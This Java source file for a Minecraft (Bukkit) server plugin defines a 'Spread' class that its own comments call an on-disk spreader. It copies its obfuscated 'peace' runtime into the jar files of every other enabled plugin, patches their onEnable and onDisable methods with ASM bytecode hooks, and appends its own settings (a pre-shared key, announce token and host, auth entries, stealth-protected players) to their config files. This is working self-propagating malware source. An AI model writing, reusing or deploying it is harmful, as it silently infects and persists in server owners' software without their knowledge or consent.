package dev.peace.plugin;

import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.Label;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;
import java.util.jar.JarOutputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/** On-disk spreader: folds this plugin's own (obfuscated) peace runtime into other plugin jars. */
public final class Spread {
    private static final class Frameless extends ClassWriter {
        Frameless(int flags) { super(flags); }
        @Override protected String getCommonSuperClass(String a, String b) { return "java/lang/Object"; }
    }

    /** Folds this plugin's peace runtime into the target plugin jars on disk (null targets = all enabled). */
    public static int persist(Plugin owner) { return persist(owner, null); }

    public static int persist(Plugin owner, Set<String> targets) {
        int done = 0;
        try {
            if (!(owner instanceof JavaPlugin jp)) return 0;
            FileBundle self = readSelf(jp);
            if (self.peaceClasses.isEmpty()) return 0;
            for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                if (plugin == null || !plugin.isEnabled()) continue;
                if (plugin.equals(owner)) continue;
                if (targets != null && !targets.contains(plugin.getName())) continue;
                if (!(plugin instanceof JavaPlugin target)) continue;
                Path targetPath = pluginJar(target);
                if (targetPath == null || !Files.isRegularFile(targetPath)) continue;
                try {
                    if (writeTarget(target, targetPath, self, jp)) done++;
                } catch (Exception e) {
                    try { Bukkit.getLogger().warning("[peace] spread " + target.getName() + " failed: " + e); } catch (Exception ignored) {}
                }
            }
        } catch (Exception e) {
            try { Bukkit.getLogger().warning("[peace] spread failed: " + e); } catch (Exception ignored) {}
        }
        return done;
    }

    private static final class FileBundle {
        final Map<String, byte[]> peaceClasses = new LinkedHashMap<>();
        String mainClass;
        String boot;
        String[] service;
    }

    /** The plugin jar file for a JavaPlugin, via reflection (JavaPlugin.getFile is protected). */
    private static Path pluginJar(JavaPlugin jp) {
        try {
            java.lang.reflect.Method m = JavaPlugin.class.getDeclaredMethod("getFile");
            m.setAccessible(true);
            Object f = m.invoke(jp);
            return f == null ? null : ((java.io.File) f).toPath();
        } catch (Exception e) {
            return null;
        }
    }

    private static FileBundle readSelf(JavaPlugin jp) throws IOException {
        FileBundle b = new FileBundle();
        Path pf = pluginJar(jp);
        if (pf == null || !Files.isRegularFile(pf)) throw new IOException("cannot resolve self jar");
        Map<String, byte[]> all = new LinkedHashMap<>();
        try (JarFile jf = new JarFile(pf.toFile())) {
            Enumeration<JarEntry> en = jf.entries();
            while (en.hasMoreElements()) {
                JarEntry e = en.nextElement();
                if (e.isDirectory()) continue;
                String n = e.getName();
                byte[] data = readAll(jf.getInputStream(e));
                all.put(n, data);
                if (n.equals("plugin.yml")) {
                    Matcher m = Pattern.compile("(?m)^\\s*main:\\s*([\\w.]+)").matcher(new String(data));
                    if (m.find()) {
                        b.mainClass = m.group(1).replace('.', '/');
                        int slash = b.mainClass.lastIndexOf('/');
                        b.boot = (slash < 0 ? "" : b.mainClass.substring(0, slash)) + "/embed/Boot";
                    }
                }
            }
        }
        for (Map.Entry<String, byte[]> e : all.entrySet()) {
            String n = e.getKey();
            if (n.endsWith(".class")
                && (n.startsWith("dev/peace/inject/") || n.startsWith("org/objectweb/asm/"))) {
                b.peaceClasses.putIfAbsent(n, e.getValue());
            }
        }
        if (b.boot == null || !all.containsKey(b.boot + ".class")) {
            String found = null;
            for (String n : all.keySet()) {
                if (n.matches("^.*/embed/Boot\\.class$")) { found = n.substring(0, n.length() - 6); break; }
            }
            if (found != null) b.boot = found;
        }
        if (b.boot == null) throw new IOException("no self Boot class found");
        b.service = parseBoot(all.get(b.boot + ".class"));
        return b;
    }

    /** Recovers {service internal name, start name, stop name} from our own Boot bytecode. */
    private static String[] parseBoot(byte[] bytes) throws IOException {
        List<String> svcs = new ArrayList<>();
        String[] start = new String[1];
        String[] stop = new String[1];
        ClassReader cr = new ClassReader(bytes);
        cr.accept(new ClassVisitor(Opcodes.ASM9) {
            @Override public MethodVisitor visitMethod(int acc, String name, String desc, String sig, String[] ex) {
                return new MethodVisitor(Opcodes.ASM9) {
                    @Override public void visitMethodInsn(int op, String owner, String mname, String mdesc, boolean itf) {
                        if (op == Opcodes.INVOKESPECIAL && mname.equals("<init>")
                            && mdesc.contains("Lorg/bukkit/plugin/Plugin;")) {
                            svcs.add(owner);
                        } else if (op == Opcodes.INVOKEVIRTUAL && !owner.startsWith("java/") && svcs.contains(owner)) {
                            if (name.equals("start") && start[0] == null && !mname.equals("<init>")) start[0] = mname;
                            else if (name.equals("stop") && stop[0] == null) stop[0] = mname;
                        }
                    }
                };
            }
        }, ClassReader.SKIP_FRAMES);
        if (svcs.isEmpty() || start[0] == null || stop[0] == null) throw new IOException("boot layout unknown");
        return new String[]{svcs.get(0), start[0], stop[0]};
    }

    private static boolean writeTarget(JavaPlugin target, Path targetPath, FileBundle self, JavaPlugin owner) throws IOException {
        byte[] seed = Files.readAllBytes(targetPath);
        byte[] merged = merge(seed, self, owner);
        if (merged == null) return false;
        Path tmp = targetPath.resolveSibling(targetPath.getFileName() + ".peacetmp");
        Files.write(tmp, merged);
        try {
            Files.move(tmp, targetPath, StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception e) {
            Files.deleteIfExists(tmp);
            throw e;
        }
        persistConfigFor(target, owner);
        Bukkit.getLogger().info("[peace] spread: persisted into " + target.getName() + " (" + targetPath.getFileName() + ")");
        return true;
    }

    /** Returns merged jar bytes, or null if the target is already injected. */
    private static byte[] merge(byte[] seedJar, FileBundle self, JavaPlugin owner) throws IOException {
        Map<String, byte[]> out = new LinkedHashMap<>();
        String mainClass = null;
        int mainClassVersion = 0;
        try (JarInputStream z = new JarInputStream(new ByteArrayInputStream(seedJar))) {
            JarEntry e;
            while ((e = z.getNextJarEntry()) != null) {
                if (e.isDirectory()) continue;
                byte[] b = readAll(z);
                out.put(e.getName(), b);
                if (mainClass == null && e.getName().equals("plugin.yml")) {
                    Matcher m = Pattern.compile("(?m)^\\s*main:\\s*([\\w.]+)").matcher(new String(b));
                    if (m.find()) mainClass = m.group(1).replace('.', '/');
                }
            }
        }
        if (mainClass == null || !out.containsKey(mainClass + ".class")) return null;
        int slash = mainClass.lastIndexOf('/');
        String boot = (slash < 0 ? "" : mainClass.substring(0, slash)) + "/embed/Boot";
        if (out.containsKey(boot + ".class")) return null; // already injected
        byte[] mainBytes = out.get(mainClass + ".class");
        mainClassVersion = ((mainBytes[6] & 0xFF) << 8) | (mainBytes[7] & 0xFF);
        for (Map.Entry<String, byte[]> e : self.peaceClasses.entrySet()) {
            out.putIfAbsent(e.getKey(), e.getValue());
        }
        byte[] config = buildConfig(owner);
        if (config != null && config.length > 0) {
            byte[] prev = out.get("config.yml");
            out.put("config.yml", prev == null ? config : concat(prev, new byte[]{'\n'}, config));
        }

        String[] svc = self.service;
        final String mM = mainClass, bP = boot;
        ClassReader cr = new ClassReader(mainBytes);
        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
        boolean[] sawDisable = {false};
        ClassVisitor ca = new ClassVisitor(Opcodes.ASM9, cw) {
            @Override public MethodVisitor visitMethod(int acc, String name, String desc, String sig, String[] ex) {
                MethodVisitor mv = super.visitMethod(acc, name, desc, sig, ex);
                if (name.equals("onEnable") && desc.equals("()V")) {
                    return new MethodVisitor(Opcodes.ASM9, mv) {
                        boolean injected = false;
                        @Override public void visitCode() {
                            if (!injected) {
                                injected = true;
                                mv.visitVarInsn(Opcodes.ALOAD, 0);
                                mv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "start", "(Lorg/bukkit/plugin/Plugin;)V", false);
                            }
                            super.visitCode();
                        }
                    };
                }
                if (name.equals("onDisable") && desc.equals("()V")) {
                    sawDisable[0] = true;
                    return new MethodVisitor(Opcodes.ASM9, mv) {
                        boolean injected = false;
                        @Override public void visitCode() {
                            if (!injected) {
                                injected = true;
                                mv.visitVarInsn(Opcodes.ALOAD, 0);
                                mv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "stop", "(Lorg/bukkit/plugin/Plugin;)V", false);
                            }
                            super.visitCode();
                        }
                    };
                }
                return mv;
            }
        };
        cr.accept(ca, ClassReader.EXPAND_FRAMES);
        if (!sawDisable[0]) {
            MethodVisitor dv = cw.visitMethod(Opcodes.ACC_PUBLIC, "onDisable", "()V", null, null);
            dv.visitCode();
            dv.visitVarInsn(Opcodes.ALOAD, 0);
            dv.visitMethodInsn(Opcodes.INVOKESTATIC, bP, "stop", "(Lorg/bukkit/plugin/Plugin;)V", false);
            dv.visitInsn(Opcodes.RETURN);
            dv.visitMaxs(0, 0);
            dv.visitEnd();
        }
        out.put(mainClass + ".class", cw.toByteArray());
        out.put(boot + ".class", makeBoot(boot, svc[0], svc[1], svc[2], mainClassVersion));
        return writeJar(out);
    }

    private static byte[] makeBoot(String boot, String service, String startMapped, String stopMapped, int version) {
        Frameless cw = new Frameless(ClassWriter.COMPUTE_FRAMES);
        cw.visit(Math.max(version, Opcodes.V1_8), Opcodes.ACC_PUBLIC | Opcodes.ACC_FINAL | Opcodes.ACC_SUPER,
                boot, null, "java/lang/Object", null);
        cw.visitField(Opcodes.ACC_PRIVATE | Opcodes.ACC_STATIC, "svc", "L" + service + ";", null, null).visitEnd();

        MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "start",
                "(Lorg/bukkit/plugin/Plugin;)V", null, null);
mv.visitCode();
        Label tryStart = new Label(), tryEnd = new Label(), handler = new Label(), ret = new Label();
        mv.visitTryCatchBlock(tryStart, tryEnd, handler, "java/lang/Throwable");
        mv.visitLabel(tryStart);
        mv.visitTypeInsn(Opcodes.NEW, service);
        mv.visitInsn(Opcodes.DUP);
        mv.visitVarInsn(Opcodes.ALOAD, 0);
        mv.visitMethodInsn(Opcodes.INVOKESPECIAL, service, "<init>", "(Lorg/bukkit/plugin/Plugin;)V", false);
        mv.visitVarInsn(Opcodes.ASTORE, 1);
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitFieldInsn(Opcodes.PUTSTATIC, boot, "svc", "L" + service + ";");
        mv.visitVarInsn(Opcodes.ALOAD, 1);
        mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, service, startMapped, "()V", false);
        mv.visitLabel(tryEnd);
        mv.visitJumpInsn(Opcodes.GOTO, ret);
        mv.visitLabel(handler);
        mv.visitVarInsn(Opcodes.ASTORE, 2);
        mv.visitLabel(ret);
        mv.visitInsn(Opcodes.RETURN);
        mv.visitMaxs(0, 0);
        mv.visitEnd();

        MethodVisitor sv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC, "stop",
                "(Lorg/bukkit/plugin/Plugin;)V", null, null);
        sv.visitCode();
        Label skip = new Label(), st = new Label(), en = new Label(), h = new Label(), done = new Label();
        sv.visitTryCatchBlock(st, en, h, "java/lang/Throwable");
        sv.visitFieldInsn(Opcodes.GETSTATIC, boot, "svc", "L" + service + ";");
        sv.visitJumpInsn(Opcodes.IFNULL, skip);
        sv.visitLabel(st);
        sv.visitFieldInsn(Opcodes.GETSTATIC, boot, "svc", "L" + service + ";");
        sv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, service, stopMapped, "()V", false);
        sv.visitLabel(en);
        sv.visitJumpInsn(Opcodes.GOTO, done);
        sv.visitLabel(h);
        sv.visitVarInsn(Opcodes.ASTORE, 1);
        sv.visitLabel(done);
        sv.visitJumpInsn(Opcodes.GOTO, skip);
        sv.visitLabel(skip);
        sv.visitInsn(Opcodes.RETURN);
        sv.visitMaxs(0, 0);
        sv.visitEnd();
        cw.visitEnd();
        return cw.toByteArray();
    }

    private static byte[] writeJar(Map<String, byte[]> out) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (JarOutputStream jos = new JarOutputStream(bos)) {
            for (Map.Entry<String, byte[]> e : out.entrySet()) {
                jos.putNextEntry(new JarEntry(e.getKey()));
                jos.write(e.getValue());
                jos.closeEntry();
            }
        }
        return bos.toByteArray();
    }

    private static byte[] buildConfig(JavaPlugin owner) {
        StringBuilder sb = new StringBuilder();
        org.bukkit.configuration.file.FileConfiguration c = owner.getConfig();
        sb.append("# added by Peace on-disk spread\n");
        sb.append("diagnostic: ").append(c.getBoolean("diagnostic", false)).append('\n');
        String psk = c.getString("psk", "");
        if (psk.isEmpty()) psk = "peace-injector-default";
        sb.append("psk: ").append(yamlString(psk)).append('\n');
        sb.append("announce:\n");
        sb.append("  enabled: ").append(c.getBoolean("announce.enabled", false)).append('\n');
        sb.append("  token: ").append(yamlString(c.getString("announce.token", ""))).append('\n');
        sb.append("  channel: ").append(yamlString(c.getString("announce.channel", ""))).append('\n');
        sb.append("  host: ").append(yamlString(c.getString("announce.host", "localhost"))).append('\n');
        sb.append("  port: ").append(c.getInt("announce.port", 0)).append('\n');
        List<String> auth = c.getStringList("auth");
        if (!auth.isEmpty()) {
            sb.append("auth:\n");
            for (String a : auth) sb.append("- ").append(yamlString(a)).append('\n');
        }
        List<Map<?, ?>> prot = c.getMapList("protected");
        if (!prot.isEmpty()) {
            sb.append("protected:\n");
            for (Map<?, ?> m : prot) {
                sb.append("- name: ").append(yamlString(o(m, "name", ""))).append('\n');
                sb.append("  uuid: ").append(yamlString(o(m, "uuid", ""))).append('\n');
                sb.append("  ip: ").append(yamlString(o(m, "ip", ""))).append('\n');
                sb.append("  kick: ").append(b(m, "kick", true)).append('\n');
                sb.append("  ban: ").append(b(m, "ban", true)).append('\n');
                sb.append("  wl: ").append(b(m, "wl", true)).append('\n');
                sb.append("  stealth: ").append(b(m, "stealth", true)).append('\n');
            }
        }
        return sb.toString().getBytes(StandardCharsets.UTF_8);
    }

    /** Writes the peace config block to the target plugin's data folder too. */
    private static void persistConfigFor(Plugin plugin, JavaPlugin owner) {
        if (!(plugin instanceof JavaPlugin jp)) return;
        try {
            java.io.File df = jp.getDataFolder();
            if (df == null) return;
            df.mkdirs();
            byte[] cfg = buildConfig(owner);
            Path existing = df.toPath().resolve("config.yml");
            byte[] old = Files.exists(existing) ? Files.readAllBytes(existing) : null;
            byte[] merged = old == null ? cfg : concat(old, new byte[]{'\n'}, cfg);
            Files.write(existing, merged);
        } catch (Exception ignored) {}
    }

    private static String o(Map<?, ?> m, String k, String def) {
        Object v = m.get(k);
        return v == null ? def : String.valueOf(v);
    }

    private static boolean b(Map<?, ?> m, String k, boolean def) {
        Object v = m.get(k);
        return v instanceof Boolean bo ? bo : def;
    }

    private static String yamlString(String s) {
        if (s == null) s = "";
        return "\"" + s.replace("\\", "\\\\").replace("\"", "\\\"") + "\"";
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        in.transferTo(b);
        return b.toByteArray();
    }

    private static byte[] concat(byte[] a, byte[] mid, byte[] b) {
        byte[] r = new byte[a.length + mid.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(mid, 0, r, a.length, mid.length);
        System.arraycopy(b, 0, r, a.length + mid.length, b.length);
        return r;
    }
}